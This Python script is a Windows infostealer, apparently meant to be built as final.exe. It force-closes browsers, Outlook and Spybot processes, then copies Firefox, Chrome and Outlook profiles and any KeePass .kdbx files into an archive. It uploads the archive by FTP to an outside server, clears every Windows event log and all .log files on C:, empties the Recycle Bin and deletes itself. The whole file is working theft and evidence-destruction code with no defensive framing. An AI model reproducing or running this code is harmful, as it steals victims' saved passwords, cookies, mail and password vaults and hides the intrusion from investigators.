import subprocess
import os
import tarfile
from subprocess import call
from ftplib import FTP
import multiprocessing
#program_file has to be named final.exe or fail
##Main functions kill, snatch and grab, ftp_trans, elete_script_final_and_step1, log_cleaner
logged_user_dir = '%USERPROFILE%'
firefox_profile_loc = '%USERPROFILE%\AppData\Roaming\Mozilla\Firefox\Profiles'
chrome_fix = "'Chrome User'"
chrome_profile_loc = '{}\AppData\Local\Google\Chrome'.format(logged_user_dir)
folder_loc = '{}\lmao'.format(logged_user_dir)
logged_user_os_fix = os.environ['USERPROFILE']
folder_loc_for_fix = '{}\lmao'.format(logged_user_os_fix)
outlook_loc = '{}\AppData\Local\Microsoft\Outlook'.format(logged_user_dir)
options_for_wev = '"wevtutil el | Foreach-Object {wevtutil cl "$_"}"'
triggers_for_trash = 'rd /s /q %systemdrive%\$Recycle.bin'
make_folder = os.system('@echo off && mkdir {} >nul 2>&1'.format(folder_loc))


folders = []
location_of_folder = subprocess.run(['cmd.exe', ['/c cd {} && dir *.kdbx /s'.format(logged_user_os_fix)]],stdout=subprocess.PIPE)
location_of_folder = location_of_folder.stdout.decode('utf-8')
location_of_folder = str(location_of_folder)
location_of_folder = location_of_folder.split()
for x in location_of_folder:
    if '\\' in x:
        folders.append(x)

def filter_kill_code(a):
    kill_split = str(a)
    kill_split = kill_split.split("'")
    kill_split = kill_split[4]
    kill_split = kill_split.split('=')
    kill_split = kill_split[1]
    kill_split = kill_split.split(')')
    kill_split = kill_split[0]
    kill_code = kill_split
    return kill_code


def return_for_code(x):
    for y in exit_codes:
        if y == filter_kill_code(x):
            print(exit_codes[y])



def folder_make_and_check(x):
    make_folder = os.system('@echo off && mkdir {} >nul 2>&1'.format(folder_loc))
    folder_code = str(x)
    if folder_code == '0':
        print('folder created')
    elif folder_code == '1':
        print('folder is made already')
        os.system('@echo off && rmdir {} /S /Q >nul 2>&1'.format(folder_loc))
        make_folder
    else:
        print('failed improper permissions')
    print(x)


def Profile_steal_with_compress():
    os.system('@echo off && robocopy /E {} {} /NFL /NDL /NJH /NJS /nc /ns /np >nul 2>&1'.format(firefox_profile_loc,folder_loc))
    os.system('@echo off && robocopy /E {} {} /NFL /NDL /NJH /NJS /nc /ns /np >nul 2>&1'.format(chrome_profile_loc,folder_loc_for_fix))
    os.system('@echo off && robocopy /E {} {} /NFL /NDL /NJH /NJS /nc /ns /np >nul 2>&1'.format(outlook_loc, folder_loc))
    for x in folders:
        os.system('@echo off && robocopy {} {} *.kdbx /NFL /NDL /NJH /NJS /nc /ns /np >nul 2>&1'.format(x,folder_loc_for_fix))
    tar = tarfile.open('{}\lmao.tar.gz'.format(logged_user_os_fix), 'w:gz')
    tar.add(folder_loc_for_fix, arcname='lmao')
    tar.close()


def kill():
    exit_codes = {'0': 'success', '1': 'access denied', '128': 'no such process'}
    firefox_pro = '/F /IM firefox.exe'
    chrome_pro = '/F /IM chrome.exe'
    outlook_pro = '/F /IM OUTLOOK.EXE'
    firefox_crash = '/F /IM crashreporter.exe'
    brave_pro = '/F /IM brave.exe'
    spy_bot_pro = ['/F /IM SDtray.exe', '/F /IM SDUpdSvc.exe', '/F /IM SDWSCSvc.exe', '/F /IM SDFSSvc.exe']
    for x in spy_bot_pro:
        kill_spy_bot = subprocess.run(['taskkill', [x]], stdout=subprocess.PIPE)
        kill_spy_bot
    kill_brave = subprocess.run(['taskkill', [brave_pro]], stdout=subprocess.PIPE)
    kill_brave
    kill_chrome = subprocess.run(['taskkill', [chrome_pro]], stdout=subprocess.PIPE)
    kill_chrome
    kill_firefox = subprocess.run(['taskkill', [firefox_pro]], stdout=subprocess.PIPE)
    kill_firefox
    kill_outlook = subprocess.run(['taskkill', [outlook_pro]], stdout=subprocess.PIPE)
    kill_outlook
    kill_firefox_crash = subprocess.run(['taskkill',[firefox_crash]],stdout=subprocess.PIPE)
    kill_firefox_crash

def snatch_and_grab():
    folder_make_and_check(make_folder)
    Profile_steal_with_compress()

##change ftp server and username and pass
def ftp_trans():
    logged_user_os_fix = os.environ['USERPROFILE']
    path_to_file = '{}\lmao.tar.gz'.format(logged_user_os_fix)
    ftp = FTP('joejoe1234.com',user='ubuntu',passwd='PASSWORD')
    ftp.set_pasv(False)
    ftp.retrlines('LIST')
    file = open(path_to_file,'rb')
    ftp.storbinary('STOR lmao.tar.gz',file)
    ftp.quit()
    file.close()

def delete_script_final():
    location_of_file = subprocess.run(['cmd.exe',['/c cd {} && dir final.exe /s /p'.format(logged_user_os_fix)]],stdout=subprocess.PIPE)
    location_of_file = location_of_file.stdout.decode('utf-8')
    location_of_file = str(location_of_file)
    location_of_file = location_of_file.split(' ')
    location_of_file = location_of_file[14]
    location_of_file = location_of_file.split()
    location_of_file =  location_of_file[0]
    os.system('@echo off && rmdir /S /Q {}\Final\ >nul 2>&1'.format(location_of_file))
    #shutdown = subprocess.run(['shutdown.exe',[' -s -t 00 ']])
    os.system('@echo off && rmdir /S /Q {}\Final\ >nul 2>&1'.format(location_of_file))
    os.system('@echo off && {} >nul 2>&1'.format(triggers_for_trash))

def log_cleaner():
    os.system('@echo off && rmdir {} /S /Q >nul 2>&1'.format(folder_loc))
    os.system('@echo off && del /F /s {}\\lmao.tar.gz >nul 2>&1'.format(logged_user_os_fix))
    os.system('@echo off && cd C:\ && del *.log /a /s /q /f >nul 2>&1')
    os.system('@echo off && powershell.exe -command {} >nul 2>&1'.format(options_for_wev))
    os.system('@echo off && {} >nul 2>&1'.format(triggers_for_trash))


##Main functions kill, snatch and grab, ftp_trans, elete_script_final_and_step1, log_cleaner
kill()
snatch_and_grab()
ftp_trans()
log_cleaner()
delete_script_final()
